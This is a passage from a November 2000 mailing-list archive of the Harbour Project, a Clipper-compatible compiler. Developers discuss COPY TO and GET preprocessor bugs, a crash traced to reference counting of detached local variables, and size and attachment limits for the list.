</I>&gt;<i> fails to do what's intended. :-(
</I>&gt;<i>
</I>&gt;<i> I know, no-one uses a var called u.  But it should work even if they
</I>&gt;<i> do. :-)
</I>
Fixed.

Ron


</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 19:34:02 2000
Date: Fri Nov  3 19:34:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO errors

<PRE>Harrier:

 __dbCopy has a few problems.  I don't fully grasp all the code, but I'm
guessing rddMoveRecords() was finished off for APPEND FROM, and support for
COPY TO was incomplete.
It seems to be only calling SELF_OPEN for the target, and doesn't call
CREATE, so the OPEN fails.
If I do have the target file there, it copies over one record forever.
Also, when it errors out, there are unreleased memory blocks.

A minor point: when receiving the parameter for REST, shouldn't it use
_parl() instead of _parnl(), or does it work in the C code to take it in as
a number?

Lastly, the REST parameter is valid for COPY TO, but it is marked as unused
in rddMoveRecords.

Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 19:35:04 2000
Date: Fri Nov  3 19:35:04 2000
From: Andrzej P. Wozniak harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>----- Original Message -----
From: &quot;Dave Pearson&quot; &lt;<A HREF="mailto:davep@davep.org">davep@davep.org</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Friday, November 03, 2000 4:32 PM
Subject: Re: [Harbour] Mailing list suggestions.


&gt;<i> On Fri, Nov 03, 2000 at 08:59:39AM -0500, Phil Barnett wrote:
</I>&gt;<i> &gt; On 3 Nov 2000, at 7:25, Dave Pearson wrote:
</I>[...]
&gt;<i> &gt; &gt; On the other hand, if such a filter simply causes problems for people
</I>&gt;<i> &gt; &gt; who quote upside down and don't know how to cleanly snip and quote in
</I>&gt;<i> &gt; &gt; context then I'm all for it.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Yeah, me, too. I've been looking for that one...
</I>&gt;<i>
</I>&gt;<i> I keep meaning to write an &quot;upside down quotes&quot; filter. Part of me says it
</I>&gt;<i> should simply look for &quot;Outlook&quot; in the headers but I think that's a
</I>&gt;<i> little unfair of me. ;&gt;
</I>
Dave,
You are not right, of course. Simply there are some people who want to drive
a car without a licence :-)

Look at my headers.

PS. I have no car, I have no driving licence :-)

--
Regards from the Harbour mirror in Poland
Andrzej P. Wozniak
<A HREF="mailto:alias@polnet.cc">alias@polnet.cc</A>   <A HREF="mailto:harbour@harbour.pl.eu.org">harbour@harbour.pl.eu.org</A>


</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 19:42:02 2000
Date: Fri Nov  3 19:42:02 2000
From: Phil Barnett harbour@lists.harbour-project.org
Subject: [Harbour] Ideas about mailing list features.

<PRE>On 3 Nov 2000, at 22:01, Jose Lalin wrote:

&gt;<i> 
</I>&gt;<i> Hi,
</I>&gt;<i> may a propose to use the &quot;Hetiquette&quot;. It is the &quot;Harbour Etiquette&quot;
</I>&gt;<i> which everybody should use in the list.
</I>&gt;<i> 
</I>&gt;<i> To Phil/Tim:
</I>&gt;<i> * Put a limit to the mail size (50kb to 100Kb)
</I>
We'll do that soon. Probably 100k.

&gt;<i> * Remove people which sends spam to the list
</I>
Currently, this is an open list. You don't have to be a member to 
post. Only to receive.

&gt;<i> * Is there a way to transform HTML posts to plain text when they
</I>&gt;<i> arrive to the server ?
</I>
Maybe. I'm looking at that and the ability to strip certain kinds of 
mime.


-- 
              Phil Barnett  mailto:<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>
                       WWW  <A HREF="http://www.the-oasis.net/">http://www.the-oasis.net/</A>
                  FTP Site  <A HREF="ftp://ftp.the-oasis.net">ftp://ftp.the-oasis.net</A>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 19:42:09 2000
Date: Fri Nov  3 19:42:09 2000
From: Phil Barnett harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>On 3 Nov 2000, at 15:32, Dave Pearson wrote:

&gt;<i> &gt; &gt; What then happens to said email? Does the admin get to approve it
</I>&gt;<i> &gt; &gt; and allow it onto the list or is it simply rejected and the sender
</I>&gt;<i> &gt; &gt; is expected to reduce it in size?
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; It goes on hold for approval.
</I>&gt;<i> 
</I>&gt;<i> Ahh, just like majordomo then. As long as the list admins don't mind
</I>&gt;<i> the extra work (and I'm guessing it would be a rare thing) that seems
</I>&gt;<i> like a reasonable way of dealing with people who lack any manners when
</I>&gt;<i> it comes to email composition.
</I>&gt;<i> 
</I>&gt;<i> &gt; &gt; On the other hand, if such a filter simply causes problems for
</I>&gt;<i> &gt; &gt; people who quote upside down and don't know how to cleanly snip
</I>&gt;<i> &gt; &gt; and quote in context then I'm all for it.
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; Yeah, me, too. I've been looking for that one...
</I>&gt;<i> 
</I>&gt;<i> I keep meaning to write an &quot;upside down quotes&quot; filter. Part of me
</I>&gt;<i> says it should simply look for &quot;Outlook&quot; in the headers but I think
</I>&gt;<i> that's a little unfair of me. ;&gt;
</I>
Well, there are a lot of old propellerheads that do upside down 
quoting, so it goes deeper than that.


-- 
              Phil Barnett  mailto:<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>
                       WWW  <A HREF="http://www.the-oasis.net/">http://www.the-oasis.net/</A>
                  FTP Site  <A HREF="ftp://ftp.the-oasis.net">ftp://ftp.the-oasis.net</A>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 19:42:19 2000
Date: Fri Nov  3 19:42:19 2000
From: Phil Barnett harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>On 3 Nov 2000, at 4:20, Andrzej P. Wozniak wrote:

&gt;<i> MS Outlook Express uses 60KB limit by default and we should stay on
</I>&gt;<i> it, I think. And what about HTML posting - an automagic warning is a
</I>&gt;<i> must.
</I>
Right now, we are just speaking of constraining maximum size, not 
content.

After a little research, I have found something I can scan content 
with, but I haven't had time to mess with it to know exactly what it 
can do.

That's an entirely 'nuther subject.

And, I'm leaning towards David's suggestion of 100k. It's not terribly 
restrictive, but it will keep somebody from mailbombing us with a 
huge packet of mail.


-- 
              Phil Barnett  mailto:<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>
                       WWW  <A HREF="http://www.the-oasis.net/">http://www.the-oasis.net/</A>
                  FTP Site  <A HREF="ftp://ftp.the-oasis.net">ftp://ftp.the-oasis.net</A>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 20:07:02 2000
Date: Fri Nov  3 20:07:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>Phil,

Just wondering, why not restrict *all* attachments, and create another list
for such ``file transfer'' purposes. There is no need for all of us,
especially those with slow/expensive connections to be &quot;forced&quot; to receive
such emails.

Actually I think a News Group would be far more appropriate for such
purpose, as one can &quot;Click and Choose&quot; which message to download, pending a
simple pointer mailed to the general list. This way any one can go to such
resource without being forced to download all attachments sent to other
individuals. One can read the subject and only download required
attachments.

I would suggest we restrict *this* list to just Plain Text, and set the
Maximum Size at a very modest 5-10K which is ample for a Valid Text Message.

I feel strongly about this suggestion, especially because messages not
complying with such guide lines, will _not_ be lost and can easily be
forwarded by Mail Administrator to the alternate appropriate List/New Group
accompanied by simple notification in this list.

Just my 2 cents.

Ron

&gt;<i> &gt; MS Outlook Express uses 60KB limit by default and we should stay on
</I>&gt;<i> &gt; it, I think. And what about HTML posting - an automagic warning is a
</I>&gt;<i> &gt; must.
</I>&gt;<i>
</I>&gt;<i> Right now, we are just speaking of constraining maximum size, not
</I>&gt;<i> content.
</I>&gt;<i>
</I>&gt;<i> After a little research, I have found something I can scan content
</I>&gt;<i> with, but I haven't had time to mess with it to know exactly what it
</I>&gt;<i> can do.
</I>&gt;<i>
</I>&gt;<i> That's an entirely 'nuther subject.
</I>&gt;<i>
</I>&gt;<i> And, I'm leaning towards David's suggestion of 100k. It's not terribly
</I>&gt;<i> restrictive, but it will keep somebody from mailbombing us with a
</I>&gt;<i> huge packet of mail.
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> --
</I>&gt;<i>               Phil Barnett  mailto:<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>
</I>&gt;<i>                        WWW  <A HREF="http://www.the-oasis.net/">http://www.the-oasis.net/</A>
</I>&gt;<i>                   FTP Site  <A HREF="ftp://ftp.the-oasis.net">ftp://ftp.the-oasis.net</A>
</I>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 20:29:02 2000
Date: Fri Nov  3 20:29:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>Brian,


&gt;<i> Harbour didn't seem to have any of the SCOPE commands preprocessed, so I had
</I>&gt;<i> pulled in the clip53 ORD.CH (Alexander you were right!) and this was giving
</I>&gt;<i> me the dbClearRel() short names.
</I>
I see, so this is basically a bug in C53.

&gt;<i> Shouldn't we be distributing the equivalent of an ord.ch?  I also needed
</I>&gt;<i> this for the dbInfo constants, which are currently defined only in
</I>&gt;<i> hbapirdd.h, which isn't something app code should be including...
</I>
Yes I think this is fine, since we're implementing the 53 RDD features.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 20:36:02 2000
Date: Fri Nov  3 20:36:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO errors

<PRE>Harrier,

The parameter checking in __DBAPP() and __DBCOPY() 
has some problems, too:

Instead of these:
     ISNIL( 2 ) ? NULL : hb_param( 2, HB_IT_ARRAY ), 
     ISNIL( 7 ) ? 0 : hb_parnl( 7 ),
You should write these:
     ISARRAY( 5 ) ? hb_param( 2, HB_IT_ARRAY ) : NULL,
     ISNUM( 7 ) ? hb_parnl( 7 ) : 0,

Generally ISNIL() should not be used in parameter checking at all.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 20:45:03 2000
Date: Fri Nov  3 20:45:03 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>&gt;<i> Not sure I agree here. It seems this would be the right place for this
</I>&gt;<i> functions (Victor?). It seems easy to extract those functions and include in
</I>&gt;<i> your replacement file, when replacement Get is used.
</I>
I think that these:

GetNew()
__GET()
__GETA()

Could be moved into a separate file. (SOURCE/RTL/GETNEW.PRG)

And this one:

CLASS TGet()

Should go to another separate file, to avoid C52 namespace pollution.
Ideally TGET Class would stay in TGET.PRG and the compatible 
GET class along with methods should move to GET.PRG.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 22:00:03 2000
Date: Fri Nov  3 22:00:03 2000
From: Phil Barnett harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>On 3 Nov 2000, at 17:08, Ron Pinkas wrote:

&gt;<i> Phil,
</I>&gt;<i> 
</I>&gt;<i> Just wondering, why not restrict *all* attachments, and create another
</I>&gt;<i> list for such ``file transfer'' purposes. There is no need for all of
</I>&gt;<i> us, especially those with slow/expensive connections to be &quot;forced&quot; to
</I>&gt;<i> receive such emails.
</I>&gt;<i> 
</I>&gt;<i> Actually I think a News Group would be far more appropriate for such
</I>&gt;<i> purpose, as one can &quot;Click and Choose&quot; which message to download,
</I>&gt;<i> pending a simple pointer mailed to the general list. This way any one
</I>&gt;<i> can go to such resource without being forced to download all
</I>&gt;<i> attachments sent to other individuals. One can read the subject and
</I>&gt;<i> only download required attachments.
</I>&gt;<i> 
</I>&gt;<i> I would suggest we restrict *this* list to just Plain Text, and set
</I>&gt;<i> the Maximum Size at a very modest 5-10K which is ample for a Valid
</I>&gt;<i> Text Message.
</I>&gt;<i> 
</I>&gt;<i> I feel strongly about this suggestion, especially because messages not
</I>&gt;<i> complying with such guide lines, will _not_ be lost and can easily be
</I>&gt;<i> forwarded by Mail Administrator to the alternate appropriate List/New
</I>&gt;<i> Group accompanied by simple notification in this list.
</I>
This idea  has merit.

I can build a new list in just a few minutes. We could make

<A HREF="mailto:harbour-binary@lists.harbour-project.org">harbour-binary@lists.harbour-project.org</A>

We could still put a restriction on it but it could be much larger 
than what I was originally proposing.

Comments?


-- 
              Phil Barnett  mailto:<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>
                       WWW  <A HREF="http://www.the-oasis.net/">http://www.the-oasis.net/</A>
                  FTP Site  <A HREF="ftp://ftp.the-oasis.net">ftp://ftp.the-oasis.net</A>

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 03:07:02 2000
Date: Sat Nov  4 03:07:02 2000
From: Dave Pearson harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>On Fri, Nov 03, 2000 at 05:08:37PM -0800, Ron Pinkas wrote:

&gt;<i> Actually I think a News Group would be far more appropriate for such
</I>&gt;<i> purpose, as one can &quot;Click and Choose&quot; which message to download, pending
</I>&gt;<i> a simple pointer mailed to the general list. This way any one can go to
</I>&gt;<i> such resource without being forced to download all attachments sent to
</I>&gt;<i> other individuals. One can read the subject and only download required
</I>&gt;<i> attachments.
</I>
An alternative location for the swapping of files that authenticates people
before allowing them to inject data is called an ftp site, not an NNTP
server.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: <A HREF="http://www.harbour-project.org/">http://www.harbour-project.org/</A>
FAQ................: <A HREF="http://www.harbour-project.org/faq/harbour.html">http://www.harbour-project.org/faq/harbour.html</A>
My harbour page....: <A HREF="http://www.hagbard.demon.co.uk/harbour/">http://www.hagbard.demon.co.uk/harbour/</A>

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 03:07:11 2000
Date: Sat Nov  4 03:07:11 2000
From: Dave Pearson harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>On Fri, Nov 03, 2000 at 09:59:38PM -0500, Phil Barnett wrote:

&gt;<i> This idea  has merit.
</I>&gt;<i> 
</I>&gt;<i> I can build a new list in just a few minutes. We could make
</I>&gt;<i> 
</I>&gt;<i> <A HREF="mailto:harbour-binary@lists.harbour-project.org">harbour-binary@lists.harbour-project.org</A>
</I>&gt;<i> 
</I>&gt;<i> We could still put a restriction on it but it could be much larger 
</I>&gt;<i> than what I was originally proposing.
</I>&gt;<i> 
</I>&gt;<i> Comments?
</I>
I think this is a solution to a problem that doesn't exist. Binaries in the
developers list aren't a problem. At least, I've never seen a problem.

The only problem we've seen of late is that fool who decided to send a
1/2meg email to abuse the list. I seriously doubt he would have been kind
enough to use a different list.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: <A HREF="http://www.harbour-project.org/">http://www.harbour-project.org/</A>
FAQ................: <A HREF="http://www.harbour-project.org/faq/harbour.html">http://www.harbour-project.org/faq/harbour.html</A>
My harbour page....: <A HREF="http://www.hagbard.demon.co.uk/harbour/">http://www.hagbard.demon.co.uk/harbour/</A>

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 03:27:03 2000
Date: Sat Nov  4 03:27:03 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>Dave,

&gt;<i> &gt; This idea  has merit.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; I can build a new list in just a few minutes. We could make
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; <A HREF="mailto:harbour-binary@lists.harbour-project.org">harbour-binary@lists.harbour-project.org</A>
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; We could still put a restriction on it but it could be much larger
</I>&gt;<i> &gt; than what I was originally proposing.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Comments?
</I>&gt;<i>
</I>&gt;<i> I think this is a solution to a problem that doesn't exist.
</I>&gt;<i> Binaries in the
</I>&gt;<i> developers list aren't a problem. At least, I've never seen a problem.
</I>&gt;<i>
</I>&gt;<i> The only problem we've seen of late is that fool who decided to send a
</I>&gt;<i> 1/2meg email to abuse the list. I seriously doubt he would have been kind
</I>&gt;<i> enough to use a different list.
</I>
It is not necessary abuse that I was attempting to address. I simply
suggested that it is not really beneficial to have *every* *one* of us
receive *every* file that one needs to forward, usually to just one or two
other individuals.

Many times such post is not addressed to a specific individual, but rather
to the first one to respond. Thus such messages are not sent privately.

We stand absolutely noting to lose, from limiting this list to text only
messages (of reasonable size).

Any such message may have a pointer to an FTP, HTTP, NNTP or what ever else
might be used as an Exchange Medium, one can use at *choice*.

Ron


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 03:40:05 2000
Date: Sat Nov  4 03:40:05 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>Dave,

&gt;<i> &gt; Actually I think a News Group would be far more appropriate for such
</I>&gt;<i> &gt; purpose, as one can &quot;Click and Choose&quot; which message to
</I>&gt;<i> download, pending
</I>&gt;<i> &gt; a simple pointer mailed to the general list. This way any one can go to
</I>&gt;<i> &gt; such resource without being forced to download all attachments sent to
</I>&gt;<i> &gt; other individuals. One can read the subject and only download required
</I>&gt;<i> &gt; attachments.
</I>&gt;<i>
</I>&gt;<i> An alternative location for the swapping of files that
</I>&gt;<i> authenticates people
</I>&gt;<i> before allowing them to inject data is called an ftp site, not an NNTP
</I>&gt;<i> server.
</I>
I don't think anyone raised the issue of authentication. I think most here
are more concerned with the simplicity of being able to exchange some files.

It seems that FTP would be far too complicated for this purpose, because we
should allow anonymous upload, as well as anonymous download from the same
folder. It also requires an FTP client, and generally speaking appears like
an over kill.

The attractive aspect of NNTP, from my perspective, was that one can easily
peek at such archive and download specific files at will. While the process
of posting and receiving is fairly simple, and I would guess all involved
have NNTP client.

I believe an HTTP archive may be just as effective if the posting process
was as simple as, mailing a message to some address.

BTW, does our web version of the list support attachments? If so we can use
an alternate list where one need not subscribe and may still only download
specific attachments at will.

Ron


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 04:44:02 2000
Date: Sat Nov  4 04:44:02 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>Ron,

Thanks so much for your superb work.


Antonio


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 04:48:01 2000
Date: Sat Nov  4 04:48:01 2000
From: harbour@lists.harbour-project.org harbour@lists.harbour-project.org
Subject: [Harbour] Re: dynsym.c caused GPF

<PRE>Brian

Yes, I did,

Will test it today...

&gt;<i> JF: 
</I>&gt;<i> Did you get the zip I sent you?
</I>&gt;<i> 
</I>&gt;<i> Brian Hays
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> 
</I>&gt;<i> 
</I>


Best regards,

J. Lefebvre &lt;<A HREF="mailto:jflefebv@mafact.com">jflefebv@mafact.com</A>&gt;
Mafact SA/NV
Belgium
(See us at <A HREF="http://www.mafact.com">http://www.mafact.com</A>)
<A HREF="mailto:jflefebv@mafact.com">jflefebv@mafact.com</A>


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 04:48:11 2000
Date: Sat Nov  4 04:48:11 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>John Skelton wrote:

&gt;<i> I guess the real plan is to change the PP's table for @ GET so it
</I>&gt;<i> puts out something special where the code block is needed, maybe:
</I>&gt;<i>   _GET_( ... __BLK__( &lt;var&gt; ) ...)
</I>&gt;<i> so that special grammar rules can do the right thing but in a more
</I>&gt;<i> general way than now?  I.e. they would be based on __BLK__( ... )
</I>&gt;<i> rather than on _GET_( ... ).
</I>&gt;<i> 
</I>&gt;<i> Hmm...  I notice the PP tables need change(s) anyway.  This:
</I>&gt;<i>   @ ... GET u
</I>&gt;<i> fails to do what's intended. :-(
</I>
  Notice that the Clipper doesn't create any codeblock if @ x,y GET is
preprocessed. The proper codeblock should be created inside __GET and
__GETA - this is the only solution that will guarantee that we will not
fall into variable names conflict.
  I have changed this and I will commit changes in few minutes.

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 05:25:03 2000
Date: Sat Nov  4 05:25:03 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Hi Jean,

I removed call to hb_gcAll() from idle.c (which seems to be the only
entry point to garbage collector) but:

Exception c0000005 at address 4b675
Called from TCLASS:CREATE(166)
Called from TSCEGLIQUERY(19)
Called from SELEZIONAQUERY(156)
Called from TSQLEDITOR:KEYBOARDHOOK(123)
Called from TSQLEDITOR:EDIT(896)
Called from MAIN(64)

Process terminated by SIGSEGV
core dumped
SYS1808:
Il processo è terminato. Il codice per la diagnostica
software (codice dell'errore) è  0005.

as you can see it dies in the same manner.

So it might not be GC to kill class creation code. What about lex/yacc
not compiling correctly? Is it possible?

I'm using simplex (which works like a charm in my opinion) now I'll try
again with flex but I think I've already made such a test without any
result.

What about hvw screwing up stack somewhere?

regards.


JF Lefebvre ha scritto:
&gt;<i> 
</I>&gt;<i> To all involved (At least maurillio, Brian and Ryszard),
</I>&gt;<i> 
</I>&gt;<i> After many hours trying to find something wrong with the class
</I>&gt;<i> inheritance, I'm near to admit it's probably not a problem for me.
</I>&gt;<i> 
</I>&gt;<i> Somewhere a pointer became nil when it should not :-((( and I can't
</I>&gt;<i> see any good or bad reason for that in my code. I really hope
</I>&gt;<i> Ryszard could find something wrong, either with it's logic or some
</I>&gt;<i> incompatibility (feel free to point me on Ryszard, so I could help !! )
</I>&gt;<i> between my code and the GC.
</I>&gt;<i> 
</I>&gt;<i> Totaly desesparate ...
</I>&gt;<i> 
</I>&gt;<i> See you all,
</I>&gt;<i> 
</I>&gt;<i> &gt; &gt; Maurilio,
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; I can't reproduce your problem here :-((((
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Perhaps, it's my fault, It is possible I have so simplified your
</I>&gt;<i> &gt; &gt; program it does'nt GPF anymore.
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Could you please try to compile the 3 files within test.zip attached and
</I>&gt;<i> &gt; &gt; let me know if it GPF or no.
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; I think I have the same inheritence you had.
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; _Take_CARE_!!!! the name of the files within test.zip will collide
</I>&gt;<i> &gt; &gt; with yours !!!! farmaq.prg, tfarmaq.prg and tsqlbrw.prg !!!!!!!!
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Please try it and let me know the result.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Maurilio, Jean,
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; The error apeares exactly just like Maurilio described in his posts.
</I>&gt;<i> &gt; I tested this on my Linux box with the same effects as Maurilio had.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; My short investigation showed me that inside __ClsInstSuper func
</I>&gt;<i> &gt; a local variable pString becomes corrupted after recursivley
</I>&gt;<i> &gt; executing
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;          /* Instance a Super class */
</I>&gt;<i> &gt;          hb_vmPushSymbol( pDynSym-&gt;pSymbol );
</I>&gt;<i> &gt;          hb_vmPushNil();
</I>&gt;<i> &gt;          hb_vmFunction( 0 );
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; when this sequence of inheritance is done : TScegliQuery -&gt;
</I>&gt;<i> &gt; TBrowseSQL -&gt; TBrowse -&gt; TObject.  Because pString is simply
</I>&gt;<i> &gt; a pointer to a stack, seems to me that for some reasons  a stack
</I>&gt;<i> &gt; becomes corrupted after some sequence.of execution. You can
</I>&gt;<i> &gt; also reproduce this kind of error by moving a logic done after
</I>&gt;<i> &gt; F2 key press to a separate function.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Seems to me that Ryszard knows much more about this issue
</I>&gt;<i> &gt; (see his email about harbour locals).
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Regards
</I>&gt;<i> &gt; Marek Paliwoda
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; _______________________________________________
</I>&gt;<i> &gt; Harbour mailing list
</I>&gt;<i> &gt; <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> &gt; <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> &gt; <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> 
</I>&gt;<i> Best regards,
</I>&gt;<i> 
</I>&gt;<i> J. Lefebvre,
</I>&gt;<i> Bruxelles,
</I>&gt;<i> Belgium
</I>&gt;<i> 
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 05:30:02 2000
Date: Sat Nov  4 05:30:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>Phil,


&gt;<i> &gt; I feel strongly about this suggestion, especially because messages not
</I>&gt;<i> &gt; complying with such guide lines, will _not_ be lost and can easily be
</I>&gt;<i> &gt; forwarded by Mail Administrator to the alternate appropriate List/New
</I>&gt;<i> &gt; Group accompanied by simple notification in this list.
</I>&gt;<i> 
</I>&gt;<i> This idea  has merit.
</I>&gt;<i> 
</I>&gt;<i> I can build a new list in just a few minutes. We could make
</I>&gt;<i> 
</I>&gt;<i> <A HREF="mailto:harbour-binary@lists.harbour-project.org">harbour-binary@lists.harbour-project.org</A>
</I>&gt;<i> 
</I>&gt;<i> We could still put a restriction on it but it could be much larger 
</I>&gt;<i> than what I was originally proposing.
</I>&gt;<i> 
</I>&gt;<i> Comments?
</I>
The problem with this is that I can't make a decision whether 
I want to get some large messages or not. If I subscribe I will 
get everything, if I don't I miss them all.

While a newsgroup would solve this, I would rather vote to simply use 
the FTP space for file exchange purposes. List members could get write 
access to a specific directory, and everyone could get read access. This 
way we also prevent the site becoming a file exchange space for pirates.

This way a simple URL would do in the email message. Another big 
advantage of this is that FTP protocoll is 30% more efficient than 
MIME encoded binary in email messages, so everyone can save 
bandwidth and time.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 05:48:01 2000
Date: Sat Nov  4 05:48:01 2000
From: Luiz Rafael Culik Guimaraes harbour@lists.harbour-project.org
Subject: [Harbour] TBColumn Class problem

<PRE>Dear Friends

Manuel Exposito Suarez reported the follow
&gt;<i>En TBColumn falta la DATA Picture que estan en Clipper 5.2 y 5.3
</I>
In Tbcolumn Class miss the Picture data that is present in Clipper 5.2 and
5.3

Can any one check

Regards from Brazil

Luiz Rafael Culik


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 06:00:05 2000
Date: Sat Nov  4 06:00:05 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Maurilio Longo wrote:

&gt;<i> I removed call to hb_gcAll() from idle.c (which seems to be the only
</I>&gt;<i> entry point to garbage collector) but:
</I>
  The garbage collector is not a source of a problem. The problem is an
incorrect reference counting related to detached local variables.
Currently the detached local variables have their own counter. This
counter is incremented/decremented correctly. However there is no proper
incrementation/decrementation for values stored in such detached
variables. 
  For example (with some over-simplification) if a variable containing
an array is passed into some functions where the detached variable is
created then the array reference counter still counts only the original
variable. So if in some point the original variable has assigned a
different value then the array can be deallocated even if it is
referenced by the detached local variable. This can result with core
dumps if later a detached variable is used - the detached variable still
points to already deallocated array.
  Things get even more complicated if objects are used with many
cross/self referencing. I am still working on it although I think I will
commit some temporary solution today (I will be not available next few
days).

&gt;<i> So it might not be GC to kill class creation code. What about lex/yacc
</I>&gt;<i> not compiling correctly? Is it possible?
</I>
  No. Please don't make incorrect assumption about flex based on simplex
bugs.

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 06:37:02 2000
Date: Sat Nov  4 06:37:02 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Hi Ryszard,

I have removed call to hb_gcAll() from idle.c so even if a local
detached variable is not correclty handled it should not be a problem
since &quot;original&quot; variable won't be deallocated anymore (hb_gcAll() is
never called).

But I have the very same exception, so it is NOT garbage collector
causing it.

